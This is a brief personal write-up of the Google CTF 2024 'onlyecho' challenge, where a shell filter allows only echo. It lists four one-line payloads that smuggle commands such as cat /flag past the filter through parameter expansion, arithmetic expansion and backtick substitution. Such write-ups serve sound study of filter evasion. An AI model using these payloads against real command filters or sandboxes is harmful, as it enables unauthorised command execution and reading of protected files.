---
tags:
  - ctf
---
https://github.com/google/google-ctf/tree/main/2024/quals/misc-onlyecho
We are given a netcat instance and a shell which has a [[Bash-Parser]] that filters out any command which is not echo.
The solution is to create a command that does not trigger this bash-parser.
The tricky and sneaky thing about this one, is that it actually parses [[POSIX]], not bash. they changed the mode to be posix instead.
so we leverage [[POSIX]] syntax to create commands which do not appear to be commands.
# Solutions
### Arithmetic Expression Solution
`a=b; echo "${a/b/$(cat /flag)}`
since `${a/b/$(whatever command)}` is valid bash.
### Bash-Parser Arithmetic Bug
``echo $((`echo lol > /tmp/$(cat /flag)`)); echo /tmp/*``
### Command Expansion Spoofing
``echo `echo \#; ls -la`
### Command Expansion Spoofing 2
``echo `echo \\\; cat /flag`
